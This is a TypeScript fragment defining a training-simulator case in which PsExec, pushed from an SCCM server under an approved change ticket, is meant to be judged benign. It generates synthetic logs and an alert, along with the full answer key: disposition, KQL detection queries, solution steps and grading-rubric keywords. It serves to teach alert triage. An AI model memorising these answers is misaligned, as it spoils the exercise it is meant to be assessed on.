  kind: 'benign',
  twin: 'impact-lateral-psexec',
  when: 'business',
  build(ctx) {
    const { rng, log, pick, idx, at, world } = ctx;
    const ad = world.org.netbios;
    const sccm = idx.host('SCCM01');
    const it = pick.person({ dept: 'IT', working: false });
    const targets = rng.sample(idx.endpoints().filter((h) => h.os.startsWith('Windows')), rng.int(4, 7));
    const ver = `4.${rng.int(1, 6)}`;
    const tStart = at - rng.int(12, 25) * MIN;
    const chg = log.ticket({
      TicketId: log.nextTicketId('CHG'), Type: 'Change', Title: `Install monitoring agent ${ver} on pilot ring via PsExec (SCCM client repair pending)`, Requester: it.upn, AssignedTo: 'svc-sccm',
      Status: 'Approved', Created: at - rng.int(2, 5) * 24 * HOUR, WindowStart: tStart - 30 * MIN, WindowEnd: tStart + 3 * HOUR, Scope: targets.map((t) => t.name).join(', '),
      Details: `Scripted from SCCM01: PsExec64 @pilot-ring.txt -s -c install_agent_v${ver}.bat. Installer: \\\\SCCM01\\Deploy$\\MonitoringAgent-${ver}.msi (signed, hash on allowlist).`,
    });
    const src = log.proc({ TimeGenerated: tStart, DeviceName: 'SCCM01', AccountName: 'svc-sccm', FileName: 'psexec64.exe', FolderPath: BIN.psexec.path, ProcessCommandLine: `PsExec64.exe @C:\\Deploy\\pilot-ring.txt -accepteula -s -c -f C:\\Deploy\\install_agent_v${ver}.bat`, SHA256: binaryHash('psexec64.exe'), Signer: BIN.psexec.signer, ProcessIntegrityLevel: 'High', InitiatingProcessFileName: 'powershell.exe', InitiatingProcessCommandLine: 'powershell.exe -File C:\\Deploy\\Start-PilotDeployment.ps1' });
    const services: RowRef[] = [];
    const installs: RowRef[] = [];
    const logons: RowRef[] = [];
    targets.forEach((t, i) => {
      const tt = tStart + (i + 1) * rng.int(20, 60) * SEC;
      logons.push(log.sec({ TimeGenerated: tt, Computer: t.name, EventID: 4624, Account: '-', TargetAccount: `${ad}\\svc-sccm`, LogonType: 3, IpAddress: sccm.ip, WorkstationName: 'SCCM01', AuthenticationPackage: 'Kerberos', ElevatedToken: 'Yes' }));
      services.push(log.sec({ TimeGenerated: tt + 2 * SEC, Computer: t.name, EventID: 7045, Account: 'LocalSystem', ServiceName: 'PSEXESVC', ServiceFileName: '%SystemRoot%\\PSEXESVC.exe' }));
      log.proc({ TimeGenerated: tt + 3 * SEC, DeviceName: t.name, AccountName: 'SYSTEM', FileName: 'psexesvc.exe', FolderPath: BIN.psexesvc.path, ProcessCommandLine: 'C:\\Windows\\PSEXESVC.exe', SHA256: binaryHash('psexesvc.exe'), Signer: BIN.psexesvc.signer, ProcessIntegrityLevel: 'System', InitiatingProcessFileName: 'services.exe', InitiatingProcessCommandLine: 'C:\\Windows\\system32\\services.exe' });
      installs.push(log.proc({ TimeGenerated: tt + 6 * SEC, DeviceName: t.name, AccountName: 'SYSTEM', FileName: 'msiexec.exe', FolderPath: 'C:\\Windows\\System32\\msiexec.exe', ProcessCommandLine: `msiexec.exe /i \\\\SCCM01\\Deploy$\\MonitoringAgent-${ver}.msi /qn /norestart`, SHA256: binaryHash('msiexec.exe'), Signer: 'Microsoft Windows', ProcessIntegrityLevel: 'System', InitiatingProcessFileName: 'cmd.exe', InitiatingProcessCommandLine: `cmd.exe /c install_agent_v${ver}.bat` }));
    });
    const sccmInfo = log.deviceRef('SCCM01');

    return {
      alert: {
        rule: 'Remote service creation via PsExec',
        product: 'Microsoft Defender for Endpoint',
        severity: 'medium',
        time: at,
        summary: `PSEXESVC was installed on ${targets.length} hosts from SCCM01 within ${Math.round(((targets.length + 1) * 40) / 60)} minutes.`,
        entities: [
          { kind: 'host', value: 'SCCM01' },
          { kind: 'user', value: 'svc-sccm' },
          ...targets.slice(0, 3).map((t) => ({ kind: 'host' as const, value: t.name })),
        ],
        fields: [['Tool', 'PsExec (Sysinternals)']],
      },
      briefing: `${world.org.name}: SCCM01 is the endpoint-management server; svc-sccm is its deployment account.`,
      truth: { disposition: 'benign', severity: 'informational', action: 'close', techniques: [], tactics: [] },
      evidence: [
        { id: 'change', label: 'An approved change covers this exact window, tool and target list', why: 'The decisive check for dual-use admin tooling.', rows: [chg] },
        { id: 'source', label: 'Source is the management server running a deployment script as the deployment account', why: 'The expected origin for fleet administration — not a user workstation.', rows: [src, sccmInfo] },
        { id: 'targets', label: 'Targets match the change scope and received the signed internal installer over Kerberos', why: 'No credential theft, no NTLM, no unexpected payload.', rows: [...services, ...installs, ...logons] },
      ],
      indicators: { block: [], scope: [], mustNot: [host('SCCM01'), { kind: 'user', value: 'svc-sccm', aliases: [`${ad}\\svc-sccm`] }] },
      hints: [
        'PsExec is dual-use. What decides it is who ran it, from where, against what, and whether anyone approved it.',
        `DeviceProcessEvents | where FileName =~ "psexec64.exe" | project TimeGenerated, DeviceName, AccountName, ProcessCommandLine`,
        'Tickets | where Type == "Change"',
      ],
      solution: [
        { title: 'Who ran PsExec, from where?', kql: 'DeviceProcessEvents\n| where FileName =~ "psexec64.exe"\n| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessCommandLine', why: 'SCCM01, svc-sccm, a deployment script.' },
        { title: 'Is there a change?', kql: 'Tickets\n| where Type == "Change" and Title has "PsExec"', why: 'Approved, window and scope match.' },
        { title: 'What landed on the targets?', kql: 'SecurityEvent\n| where EventID == 7045 and ServiceName == "PSEXESVC"\n| project TimeGenerated, Computer, ServiceFileName', why: 'Exactly the change scope.' },
        { title: 'And what ran?', kql: 'DeviceProcessEvents\n| where FileName == "msiexec.exe" and ProcessCommandLine has "MonitoringAgent"\n| project TimeGenerated, DeviceName, ProcessCommandLine', why: 'The signed internal installer from the deployment share.' },
        { title: 'How did it authenticate?', kql: 'SecurityEvent\n| where EventID == 4624 and TargetAccount has "svc-sccm"\n| summarize count() by AuthenticationPackage, WorkstationName', why: 'Kerberos from SCCM01 — no pass-the-hash.' },
        { title: 'What is SCCM01?', kql: 'DeviceInfo\n| where DeviceName == "SCCM01"', why: 'The endpoint-management server.' },
      ],
      rubric: rubric([
        ['source', 'Source is the management server (SCCM01) using the sanctioned deployment account.', ['management', 'sccm', 'source', 'svc-sccm', 'known']],
        ['change', 'An approved change ticket and window match the activity time and target scope.', ['change', 'ticket', 'chg', 'window', 'approved']],
        ['payload', 'Payload is the signed internal agent installer; Kerberos auth, no external connections.', ['signed', 'allowlist', 'internal', 'installer', 'kerberos']],
        ['close', 'Benign expected admin activity — confirm against the ticket and close; consider tuning for SCCM01.', ['benign', 'close', 'expected', 'tune', 'confirm']],
      ]),
      explanation: [
        `PsExec is dual-use: attackers use it for lateral movement, and admins use it to push software. Everything here lines up with the admin case — it runs on SCCM01, the endpoint-management server, as svc-sccm, launched by a deployment script, installing a signed internal MSI from the deployment share.`,
        `An approved change matches the time window, the tool and the exact host list, and every target authenticated svc-sccm with Kerberos from SCCM01. Compare the malicious twin: PsExec launched from a user's laptop, NTLM with a privileged account, no ticket, and a domain controller as the target.`,
        `Disposition benign. Close it with the change number. If sanctioned PsExec from SCCM01 fires this rule regularly, a scoped suppression for that source and account is reasonable tuning.`,
      ],
      pitfalls: [
        'Do not auto-escalate on the tool name — PsExec from the management host under change control is routine.',
        'The decisive checks are source host, account, authentication method, approval and payload.',
      ],
      references: [technique('T1569.002'), technique('T1021.002')],
    };
  },
};

export const endpointTemplates: CaseTemplate[] = [encodedPowerShell, certutilDownload, scheduledTask, benignAdminTool];
